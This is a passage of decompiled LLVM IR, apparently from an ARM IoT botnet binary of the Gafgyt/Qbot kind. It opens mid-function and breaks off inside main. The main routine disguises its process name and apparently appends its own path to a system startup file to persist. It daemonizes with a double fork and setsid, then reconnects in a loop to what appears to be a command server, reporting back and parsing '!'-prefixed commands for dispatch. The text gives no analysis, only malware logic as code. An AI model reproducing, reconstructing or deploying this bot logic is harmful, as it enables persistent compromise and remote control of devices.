  uselistorder i32 %v1_e594, { 1, 0 }
  uselistorder i32 %v2_e5e0, { 2, 1, 3, 6, 0, 5, 4 }
  uselistorder i32 %v3_e458, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htons, { 11, 10, 9, 8, 7, 6, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e6cc, { 1, 0 }
  uselistorder label %dec_label_pc_e670, { 1, 0 }
  uselistorder label %dec_label_pc_e5d8, { 1, 0 }
  uselistorder label %dec_label_pc_e590, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_1d0f8.542 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e71c = load i32, i32* @r4, align 4
  store i32 %v3_e71c, i32* %stack_var_-24, align 4
  store i32 59172, i32* %stack_var_-4, align 4
  %v19_e71c = ptrtoint i32* %stack_var_-24 to i32
  %v2_e720 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e720, i32* @fp, align 4
  %v1_e764 = bitcast i8** %argv to i32*
  %v2_e764 = load i32, i32* %v1_e764, align 4
  store i32 %v2_e764, i32* @r4, align 4
  %v2_e77c = load i32, i32* %v1_e764, align 4
  %v1_e780 = inttoptr i32 %v2_e77c to i8*
  %v3_e784 = call i32 @strlen(i8* %v1_e780)
  %v0_e78c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1d100.544 to i32), i32* @r1, align 4
  %v3_e798 = call i32 @strncpy(i32 %v0_e78c, i32 ptrtoint (i32* @global_var_1d100.544 to i32), i32 %v3_e784)
  store i32 ptrtoint (i32* @global_var_1d100.544 to i32), i32* %v1_e764, align 4
  %v5_e7d4 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_1d100.544 to i32), i32 0, i32 0, i32 0)
  %v2_e7dc = call i32 @__GI_time(i32* null)
  store i32 %v2_e7dc, i32* @r0, align 4
  store i32 %v2_e7dc, i32* @r4, align 4
  %v0_e7e4 = call i32 @__GI_getpid()
  %v0_e7ec = load i32, i32* @r4, align 4
  %v2_e7ec = xor i32 %v0_e7ec, %v0_e7e4
  %v1_e7f4 = call i32 @srand(i32 %v2_e7ec)
  %v2_e7fc = call i32 @__GI_time(i32* null)
  store i32 %v2_e7fc, i32* @r0, align 4
  store i32 %v2_e7fc, i32* @r4, align 4
  %v0_e804 = call i32 @__GI_getpid()
  %v0_e80c = load i32, i32* @r4, align 4
  %v2_e80c = xor i32 %v0_e80c, %v0_e804
  %v1_e814 = call i32 @init_rand(i32 %v2_e80c)
  store i32 ptrtoint ([19 x i8]* @global_var_1d104.546 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1d118.548 to i32), i32* @r1, align 4
  %v3_e830 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1d104.546 to i32), i32 ptrtoint ([2 x i8]* @global_var_1d118.548 to i32))
  %v2_e840 = icmp eq i32 %v3_e830, 0
  br i1 %v2_e840, label %dec_label_pc_e848, label %dec_label_pc_e864

dec_label_pc_e848:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1d11c.550 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1d118.548 to i32), i32* @r1, align 4
  %v3_e858 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1d11c.550 to i32), i32 ptrtoint ([2 x i8]* @global_var_1d118.548 to i32))
  br label %dec_label_pc_e864

dec_label_pc_e864:                                ; preds = %entry, %dec_label_pc_e848
  %stack_var_-88.0 = phi i32 [ %v3_e858, %dec_label_pc_e848 ], [ %v3_e830, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1d11c.550, i32 0, i32 0), %dec_label_pc_e848 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1d104.546, i32 0, i32 0), %entry ]
  %v2_e868 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_e868, label %dec_label_pc_ea00, label %dec_label_pc_e870

dec_label_pc_e870:                                ; preds = %dec_label_pc_e864
  %v2_e880 = load i32, i32* %v1_e764, align 4
  %v1_e884 = inttoptr i32 %v2_e880 to i8*
  %v3_e888 = call i32 @strlen(i8* %v1_e884)
  %v2_e89c = ptrtoint i32* %stack_var_-368 to i32
  %v2_e8a8 = call i32 @getcwd(i32 %v2_e89c, i32 256)
  store i32 ptrtoint (i32* @global_var_1d12c.552 to i32), i32* @r1, align 4
  %v2_e8b8 = bitcast i32* %stack_var_-368 to i8*
  %v3_e8b8 = call i32 @__GI_strcoll(i8* %v2_e8b8, i32 ptrtoint (i32* @global_var_1d12c.552 to i32))
  %v2_e8c0 = icmp eq i32 %v3_e8b8, 0
  br i1 %v2_e8c0, label %dec_label_pc_e9f8, label %dec_label_pc_e8d8

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e8d8
  %v1_e8d0 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_e8d8

dec_label_pc_e8d8:                                ; preds = %dec_label_pc_e870, %dec_label_pc_e8cc
  %stack_var_-84.0 = phi i32 [ %v1_e8d0, %dec_label_pc_e8cc ], [ %v3_e888, %dec_label_pc_e870 ]
  %v2_e8e8 = load i32, i32* %v1_e764, align 4
  %v2_e8f0 = add i32 %v2_e8e8, %stack_var_-84.0
  %v1_e8f4 = inttoptr i32 %v2_e8f0 to i8*
  %v2_e8f4 = load i8, i8* %v1_e8f4, align 1
  %v7_e8f8 = icmp eq i8 %v2_e8f4, 47
  br i1 %v7_e8f8, label %dec_label_pc_e900, label %dec_label_pc_e8cc

dec_label_pc_e900:                                ; preds = %dec_label_pc_e8d8
  %v2_e910 = load i32, i32* %v1_e764, align 4
  %v2_e918 = add i32 %v2_e910, %stack_var_-84.0
  %v2_e91c = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_e91c, i32* @r0, align 4
  %v8_e930 = call i32 @sprintf(i32 %v2_e91c, i32 ptrtoint ([8 x i8]* @global_var_1d130.554 to i32), i32 %v2_e89c, i32 %v2_e918, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_e98c = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_e940 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_e96c = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_e988.outer

dec_label_pc_e938:                                ; preds = %dec_label_pc_e988
  %v3_e950 = call i32 @fgets(i32 %v2_e940, i32 1024, i32 %stack_var_-88.0)
  %v3_e96c = call i32 @__GI_strcasecmp(i8* %v2_e96c, i32 %v2_e91c)
  %v2_e974 = icmp eq i32 %v3_e96c, 0
  br i1 %v2_e974, label %dec_label_pc_e97c, label %dec_label_pc_e988

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e938
  %v1_e980 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_e988.outer

dec_label_pc_e988.outer:                          ; preds = %dec_label_pc_e97c, %dec_label_pc_e900
  %stack_var_-80.0.ph = phi i32 [ %v1_e980, %dec_label_pc_e97c ], [ 0, %dec_label_pc_e900 ]
  br label %dec_label_pc_e988

dec_label_pc_e988:                                ; preds = %dec_label_pc_e988.outer, %dec_label_pc_e938
  %v2_e98c = call i32 @feof(i16* %v1_e98c)
  %v2_e994 = icmp eq i32 %v2_e98c, 0
  br i1 %v2_e994, label %dec_label_pc_e938, label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e988
  %v2_e9a0 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_e9ac = call i32 @__GI_fclose(i16* %v1_e98c)
  br i1 %v2_e9a0, label %dec_label_pc_e9a8, label %dec_label_pc_ea00

dec_label_pc_e9a8:                                ; preds = %dec_label_pc_e99c
  %v4_e9b0 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_e9b0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d138.556 to i32), i32* @r1, align 4
  %v3_e9b8 = call i32 @__GI_fopen(i32 %v4_e9b0, i32 ptrtoint (i32* @global_var_1d138.556 to i32))
  %v2_e9c8 = icmp eq i32 %v3_e9b8, 0
  br i1 %v2_e9c8, label %dec_label_pc_ea00, label %dec_label_pc_e9d0

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e9a8
  %v2_e9dc = call i32 @__GI_fputs(i32 %v2_e91c, i32 %v3_e9b8)
  %v1_e9e4 = inttoptr i32 %v3_e9b8 to i16*
  %v2_e9e4 = call i32 @__GI_fclose(i16* %v1_e9e4)
  br label %dec_label_pc_ea00

dec_label_pc_e9f8:                                ; preds = %dec_label_pc_e870
  %v1_e9fc = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_e9fc = call i32 @__GI_fclose(i16* %v1_e9fc)
  br label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e99c, %dec_label_pc_e9a8, %dec_label_pc_e864, %dec_label_pc_e9d0, %dec_label_pc_e9f8
  %v0_ea00 = call i32 @getOurIP()
  store i32 %v0_ea00, i32* @r0, align 4
  %v0_ea04 = call i32 @__libc_fork()
  store i32 %v0_ea04, i32* @r0, align 4
  %v2_ea14 = icmp eq i32 %v0_ea04, 0
  br i1 %v2_ea14, label %dec_label_pc_ea44, label %dec_label_pc_ea80

dec_label_pc_ea44:                                ; preds = %dec_label_pc_ea00
  %v0_ea44 = call i32 @__libc_fork()
  store i32 %v0_ea44, i32* @r0, align 4
  %v2_ea54 = icmp eq i32 %v0_ea44, 0
  br i1 %v2_ea54, label %dec_label_pc_ea64.thread, label %dec_label_pc_ea70

dec_label_pc_ea64.thread:                         ; preds = %dec_label_pc_ea44
  br label %dec_label_pc_ea8c

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea44
  %v1_ea60 = call i32 @__GI_exit(i32 0)
  %v2_ea78 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1d13c.558 to i32))
  store i32 %v2_ea78, i32* @r0, align 4
  br label %dec_label_pc_ea8c

dec_label_pc_ea80:                                ; preds = %dec_label_pc_ea00
  %v2_ea1c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v0_ea04, i32* @r0, align 4
  store i32 %v2_ea1c, i32* @r1, align 4
  %v3_ea2c = call i32 @__libc_waitpid(i32 %v0_ea04, i32 %v2_ea1c, i32 0)
  %v1_ea34 = call i32 @__GI_exit(i32 0)
  %v2_ea88 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1d13c.558 to i32))
  store i32 %v2_ea88, i32* @r0, align 4
  br label %dec_label_pc_ea8c

dec_label_pc_ea8c:                                ; preds = %dec_label_pc_ea64.thread, %dec_label_pc_ea70, %dec_label_pc_ea80
  %v0_ea8c = call i32 @__GI_setsid()
  %v1_ea94 = call i32 @chdir(i32 ptrtoint (i32* @global_var_1d12c.552 to i32))
  %v2_eaa0 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_f334 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_f344 = bitcast i32* %stack_var_-5744 to i8*
  %v2_f0a0 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_f0b0 = bitcast i32* %stack_var_-1648 to i8*
  %v1_ef30 = or i32 %v2_f334, 1
  %v5_ef34 = inttoptr i32 %v1_ef30 to i8*
  %v2_f204 = add i32 %v19_e71c, -600
  br label %dec_label_pc_eaa4.outer

dec_label_pc_eaa4.outer:                          ; preds = %dec_label_pc_ee88, %dec_label_pc_f324, %dec_label_pc_ea8c
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_ea8c ], [ %stack_var_-96.2.ph, %dec_label_pc_f324 ], [ %v1_ee8c, %dec_label_pc_ee88 ]
  %v0_eaa424 = call i32 @initConnection()
  %v2_eaac26 = icmp eq i32 %v0_eaa424, 0
  br i1 %v2_eaac26, label %dec_label_pc_eac0, label %dec_label_pc_eab4

dec_label_pc_eab4:                                ; preds = %dec_label_pc_eaa4.outer, %dec_label_pc_eab4
  %v1_eab8 = call i32 @sleep(i32 30)
  %v0_eaa4 = call i32 @initConnection()
  %v2_eaac = icmp eq i32 %v0_eaa4, 0
  br i1 %v2_eaac, label %dec_label_pc_eac0, label %dec_label_pc_eab4

dec_label_pc_eac0:                                ; preds = %dec_label_pc_eab4, %dec_label_pc_eaa4.outer
  %v2_eac4 = load i32, i32* @global_var_27918.46, align 4
  store i32 %v2_eac4, i32* @r5, align 4
  %v2_eacc = load i32, i32* @global_var_2db7c.80, align 4
  store i32 %v2_eacc, i32* @r0, align 4
  %v1_ead0 = call i32 @__GI_inet_ntoa(i32 %v2_eacc)
  store i32 %v1_ead0, i32* @r4, align 4
  %v0_ead8 = call i32 @getBuild()
  %v0_eae0 = load i32, i32* @r5, align 4
  %v0_eae8 = load i32, i32* @r4, align 4
  store i32 %v0_eae8, i32* @r2, align 4
  %v2_eaec = call i32 @Rootsprintf(i32 %v0_eae0, i32 ptrtoint (i32* @global_var_1d14c.562 to i32))
  br label %dec_label_pc_f324.outer

dec_label_pc_eb10:                                ; preds = %dec_label_pc_edc4, %dec_label_pc_ed70
  %v3_eb14 = mul i32 %v3_edb8, 4
  %v2_eb20 = load i32, i32* @global_var_2db88.67, align 4
  %v2_eb24 = add i32 %v2_eb20, %v3_eb14
  %v1_eb28 = inttoptr i32 %v2_eb24 to i32*
  %v2_eb28 = load i32, i32* %v1_eb28, align 4
  store i32 %v2_eb28, i32* @r0, align 4
  %v3_eb38 = call i32 @__libc_waitpid(i32 %v2_eb28, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_eb38, 1
  br i1 %tmp111, label %dec_label_pc_ed64, label %dec_label_pc_eb9c

dec_label_pc_eb58:                                ; preds = %dec_label_pc_ebf8, %dec_label_pc_eb9c
  %v2_eb5c = load i32, i32* @global_var_2db88.67, align 4
  %v3_eb68 = mul i32 %v1_eb4c, 4
  %v1_eb60 = add i32 %v3_eb68, -4
  %v2_eb6c = add i32 %v1_eb60, %v2_eb5c
  %v2_eb84 = add i32 %v2_eb5c, %v3_eb68
  %v1_eb88 = inttoptr i32 %v2_eb84 to i32*
  %v2_eb88 = load i32, i32* %v1_eb88, align 4
  %v2_eb8c = inttoptr i32 %v2_eb6c to i32*
  store i32 %v2_eb88, i32* %v2_eb8c, align 4
  br label %dec_label_pc_eb9c

dec_label_pc_eb9c:                                ; preds = %dec_label_pc_eb10, %dec_label_pc_eb58
  %v3_eb48.sink = phi i32 [ %v1_eb4c, %dec_label_pc_eb58 ], [ %v3_edb8, %dec_label_pc_eb10 ]
  %v1_eb4c = add i32 %v3_eb48.sink, 1
  %v2_ebb8 = load i32, i32* @global_var_27920.64, align 4
  %v5_ebb8 = load i32, i32* @global_var_27924.65, align 4
  %tmp112 = icmp ugt i32 %v5_ebb8, %v1_eb4c
  br i1 %tmp112, label %dec_label_pc_eb58, label %dec_label_pc_ebe0

dec_label_pc_ebe0:                                ; preds = %dec_label_pc_eb9c
  %v9_ebf0 = icmp eq i32 %v5_ebb8, %v1_eb4c
  br i1 %v9_ebf0, label %dec_label_pc_ebf8, label %dec_label_pc_ec10

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebe0
  %v9_ec08 = icmp eq i32 %v2_ebb8, 0
  br i1 %v9_ec08, label %dec_label_pc_ec10, label %dec_label_pc_eb58

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ebf8, %dec_label_pc_ebe0
  %v2_ec14 = load i32, i32* @global_var_2db88.67, align 4
  %v3_ec20 = mul i32 %v1_eb4c, 4
  %v1_ec18 = add i32 %v3_ec20, -4
  %v2_ec24 = add i32 %v1_ec18, %v2_ec14
  %v2_ec2c = inttoptr i32 %v2_ec24 to i32*
  store i32 0, i32* %v2_ec2c, align 4
  %v2_ec34 = load i32, i32* @global_var_27920.64, align 4
  %v5_ec34 = load i32, i32* @global_var_27924.65, align 4
  %v2_ec40 = add i32 %v2_ec34, -1
  %v3_ec40 = icmp ne i32 %v2_ec34, 0
  %v3_ec44 = add i32 %v5_ec34, -1
  %v4_ec44 = zext i1 %v3_ec40 to i32
  %v5_ec44 = add i32 %v3_ec44, %v4_ec44
  store i32 %v2_ec40, i32* @global_var_27920.64, align 4
  store i32 %v5_ec44, i32* @global_var_27924.65, align 4
  %v3_ec60 = icmp eq i32 %v2_ec34, 0
  %v4_ec64 = zext i1 %v3_ec60 to i32
  %v5_ec64 = add i32 %v5_ec44, %v4_ec64
  %v3_ec68 = udiv i32 %v2_ec34, 1073741824
  %v3_ec6c = mul i32 %v5_ec64, 4
  %v2_ec70 = or i32 %v3_ec6c, %v3_ec68
  store i32 %v2_ec70, i32* @r4, align 4
  %v3_ec74 = mul i32 %v2_ec34, 4
  %v1_ec7c = call i32 @malloc(i32 %v3_ec74)
  br label %dec_label_pc_ecd4

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ed30, %dec_label_pc_ecd4
  %v3_ec98 = mul i32 %v3_ed24, 4
  %v2_eca4 = add i32 %v3_ec98, %v1_ec7c
  %v2_ecb8 = load i32, i32* @global_var_2db88.67, align 4
  %v2_ecbc = add i32 %v2_ecb8, %v3_ec98
  %v1_ecc0 = inttoptr i32 %v2_ecbc to i32*
  %v2_ecc0 = load i32, i32* %v1_ecc0, align 4
  %v2_ecc4 = inttoptr i32 %v2_eca4 to i32*
  store i32 %v2_ecc0, i32* %v2_ecc4, align 4
  %v1_eccc = add i32 %v3_ed24, 1
  br label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ec10, %dec_label_pc_ec94
  %v3_ed24 = phi i32 [ 0, %dec_label_pc_ec10 ], [ %v1_eccc, %dec_label_pc_ec94 ]
  %v2_ecf0 = load i32, i32* @global_var_27920.64, align 4
  %v5_ecf0 = load i32, i32* @global_var_27924.65, align 4
  %tmp114 = icmp ugt i32 %v5_ecf0, %v3_ed24
  br i1 %tmp114, label %dec_label_pc_ec94, label %dec_label_pc_ed18

dec_label_pc_ed18:                                ; preds = %dec_label_pc_ecd4
  %v9_ed28 = icmp eq i32 %v5_ecf0, %v3_ed24
  br i1 %v9_ed28, label %dec_label_pc_ed30, label %dec_label_pc_ed48

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ed18
  %v9_ed40 = icmp eq i32 %v2_ecf0, 0
  br i1 %v9_ed40, label %dec_label_pc_ed48, label %dec_label_pc_ec94

dec_label_pc_ed48:                                ; preds = %dec_label_pc_ed30, %dec_label_pc_ed18
  %v2_ed4c = load i32, i32* @global_var_2db88.67, align 4
  store i32 %v2_ed4c, i32* @r0, align 4
  %v0_ed54 = call i32 @free()
  store i32 %v1_ec7c, i32* @global_var_2db88.67, align 4
  br label %dec_label_pc_ed64

dec_label_pc_ed64:                                ; preds = %dec_label_pc_eb10, %dec_label_pc_ed48
  %v1_ed68 = add i32 %v3_edb8, 1
  br label %dec_label_pc_ed70

dec_label_pc_ed70:                                ; preds = %dec_label_pc_f324, %dec_label_pc_ed64
  %v3_edb8 = phi i32 [ %v1_ed68, %dec_label_pc_ed64 ], [ 0, %dec_label_pc_f324 ]
  %v3_ed78 = ashr i32 %v3_edb8, 31
  %v2_ed88 = load i32, i32* @global_var_27920.64, align 4
  %v5_ed88 = load i32, i32* @global_var_27924.65, align 4
  %v3_eda4 = icmp uge i32 %v5_ed88, %v3_edb8
  %v9_eda4 = icmp eq i32 %v5_ed88, %v3_edb8
  %v2_eda8 = xor i1 %v9_eda4, true
  %v3_eda8 = and i1 %v3_eda4, %v2_eda8
  br i1 %v3_eda8, label %dec_label_pc_eb10, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %dec_label_pc_ed70
  br i1 %v9_eda4, label %dec_label_pc_edc4, label %dec_label_pc_eddc

dec_label_pc_edc4:                                ; preds = %dec_label_pc_edac
  %tmp = icmp ugt i32 %v2_ed88, %v3_ed78
  br i1 %tmp, label %dec_label_pc_eb10, label %dec_label_pc_eddc

dec_label_pc_eddc:                                ; preds = %dec_label_pc_edac, %dec_label_pc_edc4
  %v2_edf0 = add i32 %v5_f344, %v2_f334
  %v3_edf0 = inttoptr i32 %v2_edf0 to i8*
  store i8 0, i8* %v3_edf0, align 1
  %v2_ee0c = call i32 @trim(i8* %v4_f344)
  %v9_ee24 = call i32 @strstr(i32 %v2_f334, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cba8.48, i32 0, i32 0), i32 %v2_edf0, i32 %v2_f334, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_ee24, i32* @r2, align 4
  %v9_ee38 = icmp eq i32 %v9_ee24, %v2_f334
  br i1 %v9_ee38, label %dec_label_pc_ee40, label %dec_label_pc_ee58

dec_label_pc_ee40:                                ; preds = %dec_label_pc_eddc
  %v2_ee44 = load i32, i32* @global_var_27918.46, align 4
  %v3_ee50 = call i32 @Rootsprintf(i32 %v2_ee44, i32 ptrtoint ([5 x i8]* @global_var_1d1b4.567 to i32))
  br label %dec_label_pc_f324

dec_label_pc_ee58:                                ; preds = %dec_label_pc_eddc
  %v8_ee6c = call i32 @strstr(i32 %v2_f334, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d1bc.569, i32 0, i32 0), i32 %v9_ee24, i32 %v2_f334, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_ee80 = icmp eq i32 %v8_ee6c, %v2_f334
  br i1 %v9_ee80, label %dec_label_pc_ee88, label %dec_label_pc_eeb4

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee58
  %v1_ee8c = add i32 %stack_var_-96.2.ph, 1
  %v2_ee9c = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_1d1c8.571 to i32))
  %v7_eea8 = icmp slt i32 %v1_ee8c, 21
  br i1 %v7_eea8, label %dec_label_pc_eaa4.outer, label %dec_label_pc_eeac

dec_label_pc_eeac:                                ; preds = %dec_label_pc_ee88
  %v1_eeb0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_eeb4

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee58, %dec_label_pc_eeac
  %stack_var_-96.1 = phi i32 [ %v1_ee8c, %dec_label_pc_eeac ], [ %stack_var_-96.2.ph, %dec_label_pc_ee58 ]
  %v2_eec8 = load i8, i8* %v4_f344, align 4
  %v7_eecc = icmp eq i8 %v2_eec8, 33
  br i1 %v7_eecc, label %dec_label_pc_eef0, label %dec_label_pc_f324.outer

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eeb4, %dec_label_pc_ef00
  %v3_eed4.sink = phi i8* [ %storemerge8, %dec_label_pc_ef00 ], [ %v4_f344, %dec_label_pc_eeb4 ]
  %v4_eed4 = ptrtoint i8* %v3_eed4.sink to i32
  %v1_eed8 = add i32 %v4_eed4, 1
  %storemerge8 = inttoptr i32 %v1_eed8 to i8*
  %v2_eef4 = load i8, i8* %storemerge8, align 1
  %v7_eef8 = icmp eq i8 %v2_eef4, 32
  br i1 %v7_eef8, label %dec_label_pc_ef10, label %dec_label_pc_ef00

dec_label_pc_ef00:                                ; preds = %dec_label_pc_eef0
  %v2_ef04 = load i8, i8* %storemerge8, align 1
  %v2_ef08 = icmp eq i8 %v2_ef04, 0
  br i1 %v2_ef08, label %dec_label_pc_ef10, label %dec_label_pc_eef0

dec_label_pc_ef10:                                ; preds = %dec_label_pc_ef00, %dec_label_pc_eef0
  %v2_ef14 = load i8, i8* %storemerge8, align 1
  %v2_ef18 = icmp eq i8 %v2_ef14, 0
  br i1 %v2_ef18, label %dec_label_pc_f324.outer, label %dec_label_pc_ef20

dec_label_pc_ef20:                                ; preds = %dec_label_pc_ef10
  store i8 0, i8* %storemerge8, align 1
  %v3_ef40 = call i32 @strlen(i8* %v5_ef34)
  %v2_ef50 = add i32 %v3_ef40, %v2_f334
  %v1_ef54 = add i32 %v2_ef50, 2
  %v5_ef58 = inttoptr i32 %v1_ef54 to i8*
  %v1_ef88 = add i32 %v2_ef50, 1
  br label %dec_label_pc_ef84

dec_label_pc_ef60:                                ; preds = %dec_label_pc_efac, %dec_label_pc_ef84
  %v3_ef70 = call i32 @strlen(i8* %v5_ef58)
  %v2_ef78 = add i32 %v1_ef88, %v3_ef70
  %v3_ef80 = inttoptr i32 %v2_ef78 to i8*
  store i8 0, i8* %v3_ef80, align 1
  br label %dec_label_pc_ef84

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ef20, %dec_label_pc_ef60
  %v3_ef94 = call i32 @strlen(i8* %v5_ef58)
  %v2_ef9c = add i32 %v1_ef88, %v3_ef94
  %v1_efa0 = inttoptr i32 %v2_ef9c to i8*
  %v2_efa0 = load i8, i8* %v1_efa0, align 1
  %v7_efa4 = icmp eq i8 %v2_efa0, 10
  br i1 %v7_efa4, label %dec_label_pc_ef60, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %dec_label_pc_ef84
  store i32 %v1_ef88, i32* @r4, align 4
  %v3_efbc = call i32 @strlen(i8* %v5_ef58)
  %v0_efc4 = load i32, i32* @r4, align 4
  %v2_efc4 = add i32 %v0_efc4, %v3_efbc
  %v1_efc8 = inttoptr i32 %v2_efc4 to i8*
  %v2_efc8 = load i8, i8* %v1_efc8, align 1
  %v7_efcc = icmp eq i8 %v2_efc8, 13
  br i1 %v7_efcc, label %dec_label_pc_ef60, label %dec_label_pc_efd4

dec_label_pc_efd4:                                ; preds = %dec_label_pc_efac
  %v2_eff028 = load i8, i8* %v5_ef58, align 1
  %v7_eff432 = icmp eq i8 %v2_eff028, 32
  br i1 %v7_eff432, label %dec_label_pc_f00c, label %dec_label_pc_effc

dec_label_pc_efe0:                                ; preds = %dec_label_pc_effc
  %v1_efe4 = add i32 %v4_efec34, 1
  %v5_efe8 = inttoptr i32 %v1_efe4 to i8*
  %v2_eff0 = load i8, i8* %v5_efe8, align 1
  %v7_eff4 = icmp eq i8 %v2_eff0, 32
  br i1 %v7_eff4, label %dec_label_pc_f00c, label %dec_label_pc_effc

dec_label_pc_effc:                                ; preds = %dec_label_pc_efd4, %dec_label_pc_efe0
  %v4_efec34 = phi i32 [ %v1_efe4, %dec_label_pc_efe0 ], [ %v1_ef54, %dec_label_pc_efd4 ]
  %stack_var_-64.033 = phi i8* [ %v5_efe8, %dec_label_pc_efe0 ], [ %v5_ef58, %dec_label_pc_efd4 ]
  %v2_f000 = load i8, i8* %stack_var_-64.033, align 1
  %v2_f004 = icmp eq i8 %v2_f000, 0
  br i1 %v2_f004, label %dec_label_pc_f00c, label %dec_label_pc_efe0

dec_label_pc_f00c:                                ; preds = %dec_label_pc_efe0, %dec_label_pc_effc, %dec_label_pc_efd4
  %stack_var_-64.0.lcssa = phi i8* [ %v5_ef58, %dec_label_pc_efd4 ], [ %v5_efe8, %dec_label_pc_efe0 ], [ %stack_var_-64.033, %dec_label_pc_effc ]
  %v4_efec.lcssa = phi i32 [ %v1_ef54, %dec_label_pc_efd4 ], [ %v1_efe4, %dec_label_pc_efe0 ], [ %v4_efec34, %dec_label_pc_effc ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_f01c = add i32 %v4_efec.lcssa, 1
  %v2_f06039 = load i8, i8* %v5_ef58, align 1
  %v2_f06441 = icmp eq i8 %v2_f06039, 0
  br i1 %v2_f06441, label %dec_label_pc_f06c, label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %dec_label_pc_f00c, %dec_label_pc_f030
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_f030 ], [ %v5_ef58, %dec_label_pc_f00c ]
  %storemerge1442 = phi i32 [ %v1_f054, %dec_label_pc_f030 ], [ %v1_ef54, %dec_label_pc_f00c ]
  %v2_f034 = load i8, i8* %storemerge743, align 1
  %v3_f034 = zext i8 %v2_f034 to i32
  %v1_f03c = call i32 @__GI_toupper(i32 %v3_f034)
  %v1_f04c = trunc i32 %v1_f03c to i8
  store i8 %v1_f04c, i8* %storemerge743, align 1
  %v1_f054 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_f054 to i8*
  %v2_f060 = load i8, i8* %storemerge7, align 1
  %v2_f064 = icmp eq i8 %v2_f060, 0
  br i1 %v2_f064, label %dec_label_pc_f06c, label %dec_label_pc_f030

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f030, %dec_label_pc_f00c
  store i32 ptrtoint ([11 x i8]* @global_var_1d1dc.573 to i32), i32* @r1, align 4
  %v4_f078 = call i32 @__GI_strcoll(i8* %v5_ef58, i32 ptrtoint ([11 x i8]* @global_var_1d1dc.573 to i32))
  store i32 %v4_f078, i32* @r0, align 4
  %v2_f080 = icmp eq i32 %v4_f078, 0
  br i1 %v2_f080, label %dec_label_pc_f088, label %dec_label_pc_f190

dec_label_pc_f088:                                ; preds = %dec_label_pc_f06c
  %v0_f088 = call i32 @listFork()
  %v2_f090 = icmp eq i32 %v0_f088, 0
